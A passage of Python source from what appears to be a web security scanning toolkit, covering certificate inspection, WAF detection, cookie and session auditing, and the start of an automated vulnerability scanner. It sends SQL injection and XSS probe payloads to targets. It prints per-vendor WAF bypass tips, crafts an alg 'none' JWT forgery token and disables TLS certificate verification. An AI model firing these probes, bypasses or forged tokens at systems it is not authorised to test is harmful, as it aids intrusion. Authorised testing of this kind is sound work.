                    print_success(f"  ✓ Valid for {days_left} more days")
                
                # Subject Alternative Names (SAN)
                if 'subjectAltName' in cert:
                    print("\n\033[1;33m[Subject Alternative Names (SAN)]\033[0m")
                    san_list = [san[1] for san in cert['subjectAltName']]
                    
                    for i, san in enumerate(san_list[:20], 1):
                        print(f"  {i:2d}. {san}")
                    
                    if len(san_list) > 20:
                        print(f"  ... and {len(san_list) - 20} more")
                    
                    print(f"\n  Total SANs: {len(san_list)}")
                
                # TLS Version and Cipher
                print("\n\033[1;33m[Connection Security]\033[0m")
                print(f"  TLS Version: {version}")
                if cipher:
                    print(f"  Cipher Suite: {cipher[0]}")
                    print(f"  Protocol: {cipher[1]}")
                    print(f"  Key Length: {cipher[2]} bits")
                
                # Security Assessment
                print("\n\033[1;33m[Security Assessment]\033[0m")
                
                issues = []
                
                # Check TLS version
                if version in ['TLSv1', 'TLSv1.1', 'SSLv3', 'SSLv2']:
                    issues.append(f"Outdated TLS version: {version}")
                    print_error(f"  ⚠️  Using outdated {version}")
                else:
                    print_success(f"  ✓ Using modern {version}")
                
                # Check cipher strength
                if cipher and cipher[2] < 128:
                    issues.append(f"Weak cipher key length: {cipher[2]} bits")
                    print_error(f"  ⚠️  Weak cipher: {cipher[2]} bits")
                elif cipher:
                    print_success(f"  ✓ Strong cipher: {cipher[2]} bits")
                
                # Check certificate expiration
                if days_left < 30:
                    issues.append(f"Certificate expires soon: {days_left} days")
                
                # Check for self-signed
                if subject.get('commonName') == issuer.get('commonName'):
                    issues.append("Possible self-signed certificate")
                    print_warning("  ⚠️  Possible self-signed certificate")
                
                # Serial Number
                if 'serialNumber' in cert:
                    print(f"\n  Serial Number: {cert['serialNumber']}")
                
                # Summary
                print("\n\033[1;36m" + "="*60 + "\033[0m")
                print("\033[1;33m[Security Summary]\033[0m")
                print("\033[1;36m" + "="*60 + "\033[0m")
                
                if not issues:
                    print_success("\n  ✓ Certificate appears secure!")
                    print("  No major security issues detected")
                else:
                    print_warning(f"\n  Found {len(issues)} security concerns:")
                    for issue in issues:
                        print(f"    • {issue}")
                
    except ssl.SSLError as e:
        print_error(f"SSL Error: {e}")
    except socket.gaierror:
        print_error("Domain could not be resolved")
    except socket.timeout:
        print_error("Connection timeout")
    except Exception as e:
        print_error(f"Error inspecting certificate: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def active_waf_detector():
    """Detect Web Application Firewall"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ ACTIVE WAF DETECTOR ═══\033[0m\n")
    
    url = input("[?] Enter target URL tanpa http/https: ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Detecting WAF on {url}...\n")
    log_activity(f"WAF detection on {url}")
    
    # WAF Signatures
    waf_signatures = {
        'Cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id'],
            'content': ['cloudflare', 'ray id', 'cloudflare-nginx'],
            'status': [403, 503],
        },
        'Sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache'],
            'content': ['sucuri', 'access denied - sucuri', 'blocked by sucuri'],
            'status': [403],
        },
        'Imperva (Incapsula)': {
            'headers': ['x-iinfo', 'x-cdn'],
            'content': ['incapsula', 'imperva', '_incap_', 'visid_incap'],
            'status': [403],
        },
        'Akamai': {
            'headers': ['akamai-origin-hop', 'akamai-x-cache', 'akamai-x-get-request-id'],
            'content': ['akamai', 'reference #'],
            'status': [403],
        },
        'ModSecurity': {
            'headers': ['mod_security', 'modsecurity'],
            'content': ['mod_security', 'modsecurity', 'this error was generated by mod_security'],
            'status': [403, 406, 501],
        },
        'BitNinja': {
            'headers': ['x-bitninja'],
            'content': ['bitninja', 'protected by bitninja'],
            'status': [403],
        },
        'AWS WAF': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
            'content': ['aws', 'forbidden - aws'],
            'status': [403],
        },
        'Wordfence': {
            'headers': [],
            'content': ['wordfence', 'generated by wordfence', 'visit wordfence.com'],
            'status': [403],
        },
    }
    
    detected_wafs = []
    evidence = {}
    
    try:
        # Test 1: Normal Request
        print("\033[1;33m[Test 1: Baseline Request]\033[0m")
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        try:
            response = urlopen(req, timeout=10)
            headers = dict(response.headers)
            content = response.read().decode('utf-8', errors='ignore').lower()
            status_code = response.getcode()
            
            print(f"  Status: {status_code}")
            print(f"  Response Size: {len(content)} bytes")
            
            # Check headers and content for WAF signatures
            for waf_name, signatures in waf_signatures.items():
                detected = False
                waf_evidence = []
                
                # Check headers
                for header in signatures['headers']:
                    for response_header in headers.keys():
                        if header.lower() in response_header.lower():
                            detected = True
                            waf_evidence.append(f"Header: {response_header}")
                
                # Check content
                for pattern in signatures['content']:
                    if pattern.lower() in content:
                        detected = True
                        waf_evidence.append(f"Content: '{pattern}'")
                
                if detected:
                    detected_wafs.append(waf_name)
                    evidence[waf_name] = waf_evidence
            
        except HTTPError as e:
            status_code = e.code
            headers = dict(e.headers)
            content = e.read().decode('utf-8', errors='ignore').lower()
            
            print(f"  Status: {status_code}")
            
            # Check for WAF on error pages
            for waf_name, signatures in waf_signatures.items():
                if status_code in signatures['status']:
                    for pattern in signatures['content']:
                        if pattern.lower() in content:
                            if waf_name not in detected_wafs:
                                detected_wafs.append(waf_name)
                                evidence[waf_name] = [f"Error page pattern: '{pattern}'"]
        
        # Test 2: Malicious Payload (SQL Injection)
        print("\n\033[1;33m[Test 2: SQLi Payload Test]\033[0m")

        payload = "1' OR '1'='1"
        payload_encoded = quote(payload, safe='')  # <<< tambahkan baris ini

        test_url = url.rstrip('/') + "/?id=" + payload_encoded
        req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
        
        try:
            response = urlopen(req, timeout=10)
            print(f"  Status: {response.getcode()} - No blocking detected")
        except HTTPError as e:
            print(f"  Status: {e.code} - Request BLOCKED")
            
            if e.code == 403:
                print_warning("  ⚠️  403 Forbidden - WAF likely present")
                
                content = e.read().decode('utf-8', errors='ignore').lower()
                
                # Re-check for WAF signatures
                for waf_name, signatures in waf_signatures.items():
                    for pattern in signatures['content']:
                        if pattern.lower() in content:
                            if waf_name not in detected_wafs:
                                detected_wafs.append(waf_name)
                                evidence[waf_name] = evidence.get(waf_name, []) + [f"SQLi block: '{pattern}'"]
        
        # Test 3: XSS Payload
        print("\n\033[1;33m[Test 3: XSS Payload Test]\033[0m")
        
        xss_payload = "<script>alert(1)</script>"
        xss_encoded = quote(xss_payload, safe='')   # <<< encode XSS payload

        test_url = url.rstrip('/') + "/?q=" + xss_encoded
        req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
        
        try:
            response = urlopen(req, timeout=10)
            print(f"  Status: {response.getcode()} - No blocking detected")
        except HTTPError as e:
            print(f"  Status: {e.code} - Request BLOCKED")
            
            if e.code == 403 and 'XSS' not in str(detected_wafs):
                print_warning("  ⚠️  XSS payload blocked - WAF active")
        
        # Test 4: User-Agent Test
        print("\n\033[1;33m[Test 4: Suspicious User-Agent Test]\033[0m")
        
        req = Request(url, headers={'User-Agent': 'sqlmap/1.0'})
        
        try:
            response = urlopen(req, timeout=10)
            print(f"  Status: {response.getcode()} - No blocking")
        except HTTPError as e:
            print(f"  Status: {e.code} - BLOCKED")
            print_warning("  ⚠️  Suspicious UA blocked - WAF fingerprinting protection")
        
        # Test 5: Latency Fingerprinting
        print("\n\033[1;33m[Test 5: Latency Analysis]\033[0m")
        
        latencies = []
        for i in range(3):
            start = time.time()
            try:
                req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                urlopen(req, timeout=10)
                latency = (time.time() - start) * 1000
                latencies.append(latency)
                print(f"  Request {i+1}: {latency:.2f}ms")
            except:
                pass
        
        if latencies:
            avg_latency = sum(latencies) / len(latencies)
            
            if avg_latency > 500:
                print_warning(f"  ⚠️  High avg latency ({avg_latency:.2f}ms) - possible WAF processing")
            else:
                print_success(f"  ✓ Normal latency ({avg_latency:.2f}ms)")
        
        # Results
        print("\n")
        print("\033[1;36m" + "="*60 + "\033[0m")
        print("\033[1;33m[WAF DETECTION RESULTS]\033[0m")
        print("\033[1;36m" + "="*60 + "\033[0m\n")
        
        if detected_wafs:
            print_warning(f"⚠️  DETECTED {len(detected_wafs)} WAF(s):\n")
            
            for waf in detected_wafs:
                print(f"\033[1;31m[{waf}]\033[0m")
                
                if waf in evidence:
                    print("  Evidence:")
                    for ev in evidence[waf]:
                        print(f"    • {ev}")
                
                # Protection mode assessment
                print("  Protection Mode: ", end='')
                if len(evidence.get(waf, [])) > 2:
                    print("\033[1;31mHigh (Active blocking)\033[0m")
                elif len(evidence.get(waf, [])) > 0:
                    print("\033[1;33mMedium (Detection mode)\033[0m")
                else:
                    print("\033[1;32mLow (Monitoring only)\033[0m")
                
                # Bypass suggestions
                print("  Bypass Suggestions:")
                
                if waf == 'Cloudflare':
                    print("    • Try changing User-Agent")
                    print("    • Use case variation in payloads")
                    print("    • Try encoding (URL, Base64)")
                    print("    • Direct IP access (if available)")
                    print("    • IPv6 if supported")
                
                elif waf == 'ModSecurity':
                    print("    • Use mixed case keywords")
                    print("    • Try alternative syntax")
                    print("    • Use comments in SQL (/**/, --)")
                    print("    • HTTP Parameter Pollution (HPP)")
                
                elif waf == 'Imperva (Incapsula)':
                    print("    • Try JSON/XML payloads")
                    print("    • Use content-type variations")
                    print("    • Multiple encoding layers")
                    print("    • Slow request timing")
                
                elif waf == 'Akamai':
                    print("    • Geographic source variation")
                    print("    • Session-based payloads")
                    print("    • Multi-step attacks")
                
                else:
                    print("    • Try payload encoding")
                    print("    • Use alternative syntax")
                    print("    • Test during low-traffic periods")
                    print("    • Fragment payloads across parameters")
                
                print()
        else:
            print_success("✓ No WAF detected!")
            print("  Target appears to be directly accessible")
            print("  or using undetectable protection")
        
        # Additional recommendations
        print("\033[1;33m[Security Recommendations]\033[0m")
        
        if detected_wafs:
            print("  For attackers:")
            print("    • Always get authorization before testing")
            print("    • Use evasion techniques responsibly")
            print("    • Stay within legal boundaries")
            print("\n  For defenders:")
            print("    • WAF detected = Good! Keep it updated")
            print("    • Enable logging and monitoring")
            print("    • Use defense-in-depth strategy")
            print("    • Regular security audits recommended")
        else:
            print("  For defenders:")
            print("    ⚠️  No WAF detected - Consider implementing:")
            print("    • Cloudflare (Free tier available)")
            print("    • ModSecurity (Open-source)")
            print("    • Sucuri (Premium protection)")
            print("    • Application-level input validation")
    
    except Exception as e:
        print_error(f"Error during WAF detection: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def cookie_session_audit():
    """Advanced Cookie and Session Security Audit"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ COOKIE & SESSION AUDIT ═══\033[0m\n")
    
    url = input("[?] Enter target URL: ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Auditing cookies and sessions for {url}...\n")
    log_activity(f"Cookie/Session audit on {url}")
    
    try:
        from http.cookiejar import CookieJar
        from urllib.request import HTTPCookieProcessor, build_opener
        import hashlib
        import base64
        
        # Create cookie jar
        cookie_jar = CookieJar()
        opener = build_opener(HTTPCookieProcessor(cookie_jar))
        import ssl
        ssl._create_default_https_context = ssl._create_unverified_context
        
        from urllib.request import HTTPSHandler
        
        # Paksa opener menggunakan SSL context yang tidak memverifikasi sertifikat
        opener.add_handler(HTTPSHandler(context=ssl._create_unverified_context()))
        
        # Tambahkan User-Agent
        opener.addheaders = [
            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        ]
        
        # Test 1: Initial Request
        print("\033[1;33m[Test 1: Cookie Collection]\033[0m")
        
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        response = opener.open(req, timeout=10)
        
        cookies = list(cookie_jar)
        
        if cookies:
            print_success(f"Found {len(cookies)} cookie(s):\n")
            
            for i, cookie in enumerate(cookies, 1):
                print(f"  [{i}] {cookie.name}")
                print(f"      Value: {cookie.value[:50]}{'...' if len(cookie.value) > 50 else ''}")
                print(f"      Domain: {cookie.domain}")
                print(f"      Path: {cookie.path}")
                print(f"      Secure: {cookie.secure}")
                print(f"      HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
                print(f"      Expires: {cookie.expires if cookie.expires else 'Session'}")
                print()
        else:
            print_warning("No cookies found in response")
        
        # Test 2: Cookie Security Analysis
        print("\033[1;33m[Test 2: Cookie Security Analysis]\033[0m\n")
        
        vulnerabilities = []
        
        for cookie in cookies:
            cookie_vulns = []
            
            # Check Secure flag
            if not cookie.secure and url.startswith('https://'):
                cookie_vulns.append("Missing Secure flag on HTTPS")
                vulnerabilities.append(f"{cookie.name}: Missing Secure flag")
            
            # Check HttpOnly flag
            if not cookie.has_nonstandard_attr('HttpOnly'):
                cookie_vulns.append("Missing HttpOnly flag (XSS risk)")
                vulnerabilities.append(f"{cookie.name}: Missing HttpOnly flag")
            
            # Check SameSite
            if not cookie.has_nonstandard_attr('SameSite'):
                cookie_vulns.append("Missing SameSite flag (CSRF risk)")
                vulnerabilities.append(f"{cookie.name}: Missing SameSite flag")
            
            # Check expiration
            if not cookie.expires:
                cookie_vulns.append("Session cookie (no expiration)")
            
            if cookie_vulns:
                print_warning(f"[{cookie.name}]")
                for vuln in cookie_vulns:
                    print(f"  ⚠️  {vuln}")
                print()
        
        if not vulnerabilities:
            print_success("✓ All cookies have proper security flags!")
        
        # Test 3: Session ID Analysis
        print("\033[1;33m[Test 3: Session ID Analysis]\033[0m\n")
        
        session_cookies = []
        
        for cookie in cookies:
            # Common session cookie names
            session_names = ['sessionid', 'session', 'jsessionid', 'phpsessid', 
                           'asp.net_sessionid', 'sid', 'token', 'auth']
            
            if any(name in cookie.name.lower() for name in session_names):
                session_cookies.append(cookie)
        
        if session_cookies:
            print_info(f"Found {len(session_cookies)} session cookie(s):\n")
            
            for cookie in session_cookies:
                print(f"[{cookie.name}]")
                print(f"  Value: {cookie.value}")
                print(f"  Length: {len(cookie.value)} characters")
                
                # Entropy check (simple)
                unique_chars = len(set(cookie.value))
                entropy_ratio = unique_chars / len(cookie.value) if len(cookie.value) > 0 else 0
                
                print(f"  Unique chars: {unique_chars}/{len(cookie.value)}")
                print(f"  Entropy ratio: {entropy_ratio:.2f}")
                
                if entropy_ratio < 0.5:
                    print_error("  ⚠️  LOW ENTROPY - Predictable session ID!")
                    vulnerabilities.append(f"{cookie.name}: Low entropy session ID")
                elif entropy_ratio < 0.7:
                    print_warning("  ⚠️  Medium entropy - Could be improved")
                else:
                    print_success("  ✓ High entropy - Good randomness")
                
                # Check for sequential patterns
                if any(cookie.value[i:i+3].isdigit() and 
                      int(cookie.value[i:i+3]) in range(100, 999) 
                      for i in range(len(cookie.value)-2)):
                    print_warning("  ⚠️  Sequential numbers detected")
                    vulnerabilities.append(f"{cookie.name}: Sequential patterns")
                
                # Check for timestamp patterns
                import time
                current_time = int(time.time())
                
                # Check if session ID contains timestamp
                for i in range(len(cookie.value) - 9):
                    substr = cookie.value[i:i+10]
                    if substr.isdigit():
                        timestamp = int(substr)
                        if abs(timestamp - current_time) < 86400 * 365:  # Within 1 year
                            print_warning("  ⚠️  Possible timestamp in session ID")
                            vulnerabilities.append(f"{cookie.name}: Contains timestamp")
                            break
                
                print()
        else:
            print_warning("No session cookies identified")
        
        # Test 4: JWT Analysis (if present)
        print("\033[1;33m[Test 4: JWT Token Analysis]\033[0m\n")
        
        jwt_found = False
        
        # Check cookies for JWT
        for cookie in cookies:
            value = cookie.value
            
            # JWT format: xxxxx.yyyyy.zzzzz
            if value.count('.') == 2:
                parts = value.split('.')
                
                if all(len(part) > 10 for part in parts):
                    jwt_found = True
                    
                    print_warning(f"[Possible JWT in {cookie.name}]")
                    print(f"  Token: {value[:50]}...")
                    
                    try:
                        # Decode header
                        header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                        header = base64.urlsafe_b64decode(header_padded).decode('utf-8')
                        header_json = json.loads(header)
                        
                        print("\n  Header:")
                        print(f"    Algorithm: {header_json.get('alg', 'Unknown')}")
                        print(f"    Type: {header_json.get('typ', 'Unknown')}")
                        
                        # Check for weak algorithm
                        if header_json.get('alg') == 'none':
                            print_error("    ⚠️  CRITICAL: Algorithm is 'none'!")
                            vulnerabilities.append("JWT: Algorithm 'none' allowed")
                        elif header_json.get('alg') in ['HS256', 'HS384', 'HS512']:
                            print_warning("    ⚠️  Using HMAC (symmetric key)")
                            print("    → Vulnerable if secret is weak")
                        
                        # Decode payload
                        payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                        payload = base64.urlsafe_b64decode(payload_padded).decode('utf-8')
                        payload_json = json.loads(payload)
                        
                        print("\n  Payload:")
                        for key, value in payload_json.items():
                            if key not in ['exp', 'iat', 'nbf']:
                                print(f"    {key}: {value}")
                        
                        # Check expiration
                        if 'exp' in payload_json:
                            exp_time = payload_json['exp']
                            current = int(time.time())
                            
                            if exp_time < current:
                                print_error("    ⚠️  Token is EXPIRED!")
                            else:
                                remaining = exp_time - current
                                print(f"    Expires in: {remaining//3600}h {(remaining%3600)//60}m")
                        else:
                            print_warning("    ⚠️  No expiration (exp) claim")
                            vulnerabilities.append("JWT: No expiration claim")
                        
                        # Signature analysis
                        print("\n  Signature:")
                        signature = parts[2]
                        print(f"    Length: {len(signature)} characters")
                        
                        if len(signature) < 20:
                            print_error("    ⚠️  Very short signature - possibly weak!")
                            vulnerabilities.append("JWT: Weak signature")
                        
                        # Test for 'none' algorithm attack
                        print("\n  Security Tests:")
                        
                        # Create unsigned token
                        unsigned_header = base64.urlsafe_b64encode(
                            json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
                        ).decode().rstrip('=')
                        
                        unsigned_token = f"{unsigned_header}.{parts[1]}."
                        
                        print("    Testing 'none' algorithm bypass:")
                        print(f"    Crafted token: {unsigned_token[:50]}...")
                        
                    except Exception as e:
                        print_error(f"    Failed to decode JWT: {str(e)[:50]}")
                    
                    print()
        
        if not jwt_found:
            print_info("No JWT tokens detected")
        
        # Test 5: Session Fixation Test
        print("\033[1;33m[Test 5: Session Fixation Test]\033[0m\n")
        
        if session_cookies:
            print_info("Testing if session ID changes after 'login'...\n")
            
            # Store original session IDs
            original_sessions = {c.name: c.value for c in session_cookies}
            
            # Make another request (simulating login)
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            response = opener.open(req, timeout=10)
            
            new_cookies = list(cookie_jar)
            new_sessions = {}
            
            for cookie in new_cookies:
                if cookie.name in original_sessions:
                    new_sessions[cookie.name] = cookie.value
            
            # Compare
            changed = False
            for name in original_sessions:
                if name in new_sessions:
                    if original_sessions[name] != new_sessions[name]:
                        print_success(f"  [{name}] Session ID changed ✓")
                        changed = True
                    else:
                        print_error(f"  [{name}] Session ID NOT changed ⚠️")
                        vulnerabilities.append(f"{name}: Session fixation vulnerability")
            
            if not changed and original_sessions:
                print_warning("\n  ⚠️  Session IDs remain the same!")
                print("  Possible session fixation vulnerability")
        else:
            print_warning("No session cookies to test")
        
        # Test 6: Cookie Hijacking Risk
        print("\n\033[1;33m[Test 6: Cookie Hijacking Risk Assessment]\033[0m\n")
        
        risk_score = 0
        risk_factors = []
        
        for cookie in cookies:
            # Check for sensitive cookies without security
            if any(name in cookie.name.lower() for name in ['session', 'auth', 'token', 'login']):
                if not cookie.secure:
                    risk_score += 30
                    risk_factors.append(f"{cookie.name}: No Secure flag (HIGH RISK)")
                
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    risk_score += 20
                    risk_factors.append(f"{cookie.name}: No HttpOnly (XSS risk)")
                
                if not cookie.has_nonstandard_attr('SameSite'):
                    risk_score += 15
                    risk_factors.append(f"{cookie.name}: No SameSite (CSRF risk)")
        
        print(f"Risk Score: {risk_score}/100\n")
        
        if risk_score == 0:
            print_success("✓ LOW RISK - Cookies appear secure")
        elif risk_score < 30:
            print_warning("⚠️  MEDIUM RISK - Some security improvements needed")
        else:
            print_error("⚠️  HIGH RISK - Multiple security issues detected!")
        
        if risk_factors:
            print("\nRisk Factors:")
            for factor in risk_factors:
                print(f"  • {factor}")
        
        # Summary
        print("\n")
        print("\033[1;36m" + "="*60 + "\033[0m")
        print("\033[1;33m[AUDIT SUMMARY]\033[0m")
        print("\033[1;36m" + "="*60 + "\033[0m\n")
        
        print(f"Total Cookies: {len(cookies)}")
        print(f"Session Cookies: {len(session_cookies)}")
        print(f"Vulnerabilities Found: {len(set(vulnerabilities))}")
        print(f"Overall Risk: {risk_score}/100")
        
        if vulnerabilities:
            print("\n\033[1;33m[Vulnerabilities]\033[0m")
            for vuln in set(vulnerabilities):
                print(f"  • {vuln}")
        
        # Recommendations
        print("\n\033[1;33m[Recommendations]\033[0m")
        print("  For Developers:")
        print("    • Always use Secure flag on HTTPS")
        print("    • Enable HttpOnly to prevent XSS")
        print("    • Use SameSite=Strict or Lax")
        print("    • Regenerate session IDs after login")
        print("    • Use high-entropy random session IDs")
        print("    • Implement session timeout")
        print("    • For JWT: Use RS256 instead of HS256")
        print("    • Never use 'none' algorithm in JWT")
    
    except Exception as e:
        print_error(f"Error during cookie audit: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def leetscanner_menu():
    """LeetScanner - Automated Web Vulnerability Scanner"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.PURPLE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║           🔍 LEETSCANNER - AUTOMATED WEB SCANNER          ║")
    print(f"║                  Inspired by LeetScanner Bot                  ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
    
    print(f"{Colors.OKCYAN}[SCANNER MODES]{Colors.ENDC}\n")
    print("1. [FULL SCAN] - Complete vulnerability assessment")
    print("2. [HIGH RISK] - Critical vulnerabilities only")
    print("3. [FOKUS XSS] - Cross-Site Scripting focused")
    print("4. [FOKUS SQLi] - SQL Injection focused")
    print("5. [SANS TOP 25] - SANS Top 25 vulnerabilities")
    print("6. [OWASP TOP 10] - OWASP Top 10 vulnerabilities")
    print("7. [CUSTOM SCAN] - Custom vulnerability selection")
    print("0. Back to Main Menu\n")
    
    choice = input(f"{Colors.WARNING}[?] Select scan mode: {Colors.ENDC}").strip()
    
    if choice == '1':
        leetscanner_full_scan()
    elif choice == '2':
        leetscanner_high_risk()
    elif choice == '3':
        leetscanner_xss_focus()
    elif choice == '4':
        leetscanner_sqli_focus()
    elif choice == '5':
        leetscanner_sans_top25()
    elif choice == '6':
        leetscanner_owasp_top10()
    elif choice == '7':
        leetscanner_custom_scan()
    elif choice == '0':
        return
    else:
        print_error("Invalid option!")
        time.sleep(1)
        leetscanner_menu()

def leetscanner_full_scan():
    """Full automated vulnerability scan - UPGRADED VERSION"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.BOLD}{Colors.PURPLE}[FULL SCAN MODE - ENTERPRISE EDITION]{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Generate scan ID
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING FULL SCAN]...{Colors.ENDC}\n")
    
    print(f"{Colors.OKCYAN}TARGET:{Colors.ENDC} {target}")
    print(f"{Colors.GRAY}◼ SCAN ID:{Colors.ENDC} {scan_id}\n")
    
    loading_animation("Initializing advanced scanner engine", duration=2, style="braille")
    
    # Vulnerability storage
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    # Scan statistics
    scan_stats = {
        'start_time': time.time(),
        'requests_sent': 0,
        'errors': 0,
        'findings': 0
    }
    
    total_tests = 30  # Increased from 15 to 30 tests
    current_test = 0
    
    print(f"\n{Colors.WARNING}⏳ [STATUS] >{Colors.OKGREEN} Running{Colors.ENDC}")
    print(f"{Colors.GRAY}[Engine: DRGXEL Advanced Scanner v2.0]{Colors.ENDC}\n")

    print(f"\n{Colors.OKCYAN}[PHASE 1: RECONNAISSANCE]{Colors.ENDC}\n")
    
    # Test 1: SSL/TLS & HTTPS Check
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 1', suffix='SSL/TLS Analysis')
    time.sleep(0.3)
    
    try:
        parsed = urlparse(target)
        
        # Check if HTTPS
        if parsed.scheme == 'http':
            vulnerabilities['medium'].append({
                'name': 'Insecure HTTP Protocol',
                'cvss': '5.3',
                'confidence': '100%',
                'cve': 'CWE-319',
                'description': 'Website uses unencrypted HTTP instead of HTTPS',
                'impact': 'Data transmitted in plaintext. Vulnerable to man-in-the-middle attacks.',
                'remediation': 'Implement HTTPS with valid SSL/TLS certificate and enforce redirection.'
            })
            scan_stats['findings'] += 1
        
        # Check HSTS (only for HTTPS sites)
        if parsed.scheme == 'https':
            try:
                req = Request(target, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
                response = urlopen(req, timeout=10)
                headers = dict(response.headers)
                scan_stats['requests_sent'] += 1
                
                if 'Strict-Transport-Security' not in headers:
                    vulnerabilities['medium'].append({
                        'name': 'HTTP Strict Transport Security (HSTS) Not Enabled',
                        'cvss': '5.9',
                        'confidence': '100%',
                        'cve': 'CWE-523',
                        'description': 'HSTS header missing. Protocol downgrade attacks possible.',
                        'impact': 'Attackers can downgrade connections to HTTP and intercept traffic.',
                        'remediation': 'Add Strict-Transport-Security header: max-age=31536000; includeSubDomains; preload'
                    })
                    scan_stats['findings'] += 1
                else:
                    # Check HSTS configuration
                    hsts_value = headers['Strict-Transport-Security']
                    if 'max-age' not in hsts_value or 'includeSubDomains' not in hsts_value:
                        vulnerabilities['low'].append({
                            'name': 'Weak HSTS Configuration',
                            'cvss': '3.7',
                            'confidence': '100%',
                            'cve': 'CWE-523',
                            'description': 'HSTS enabled but with suboptimal configuration',
                            'impact': 'Partial protection only. Subdomains may be vulnerable.',
                            'remediation': 'Use: max-age=31536000; includeSubDomains; preload'
                        })
                        scan_stats['findings'] += 1
                
            except Exception as e:
                scan_stats['errors'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 2: Server Fingerprinting
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 1', suffix='Server Fingerprinting')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=10)
        headers = dict(response.headers)
        scan_stats['requests_sent'] += 1
        
        # Check for server disclosure
        if 'Server' in headers or 'X-Powered-By' in headers:
            server_info = headers.get('Server', '') + ' ' + headers.get('X-Powered-By', '')
            vulnerabilities['info'].append({
                'name': 'Server Information Disclosure',
                'cvss': '0.0',
                'confidence': '100%',
                'cve': 'CWE-200',
                'description': f'Server version exposed: {server_info.strip()}',
                'impact': 'Helps attackers identify known vulnerabilities in specific server versions.',
                'remediation': 'Remove or obfuscate Server and X-Powered-By headers.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 3: WAF Detection
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 1', suffix='WAF Detection')
    time.sleep(0.3)
    
    waf_detected = None
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=10)
        headers = dict(response.headers)
        content = response.read().decode('utf-8', errors='ignore').lower()
        scan_stats['requests_sent'] += 1
        
        # Check common WAF signatures
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'Sucuri': ['x-sucuri-id', 'sucuri'],
            'Imperva': ['x-iinfo', 'incapsula'],
            'Akamai': ['akamai'],
            'ModSecurity': ['mod_security'],
        }
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in str(headers).lower() or sig in content:
                    waf_detected = waf_name
                    vulnerabilities['info'].append({
                        'name': f'Web Application Firewall Detected: {waf_name}',
                        'cvss': '0.0',
                        'confidence': '90%',
                        'cve': 'INFO',
                        'description': f'{waf_name} WAF detected protecting this application',
                        'impact': 'WAF may block attack attempts. Adjust testing strategy accordingly.',
                        'remediation': 'N/A - This is informational'
                    })
                    scan_stats['findings'] += 1
                    break
            if waf_detected:
                break
    except:
        scan_stats['errors'] += 1
    
    # Test 4: Technology Stack Detection
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 1', suffix='Technology Detection')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        scan_stats['requests_sent'] += 1
        
        # Detect frameworks and libraries
        technologies = []
        
        if 'wp-content' in content or 'wp-includes' in content:
            technologies.append('WordPress')
        if 'joomla' in content.lower():
            technologies.append('Joomla')
        if 'drupal' in content.lower():
            technologies.append('Drupal')
        if 'jquery' in content.lower():
            jquery_match = re.search(r'jquery[/-](\d+\.\d+\.\d+)', content, re.IGNORECASE)
            if jquery_match:
                technologies.append(f'jQuery {jquery_match.group(1)}')
        if 'react' in content.lower():
            technologies.append('React')
        if 'angular' in content.lower():
            technologies.append('Angular')
        if 'vue' in content.lower():
            technologies.append('Vue.js')
        
        if technologies:
            vulnerabilities['info'].append({
                'name': 'Technology Stack Identified',
                'cvss': '0.0',
                'confidence': '85%',
                'cve': 'INFO',
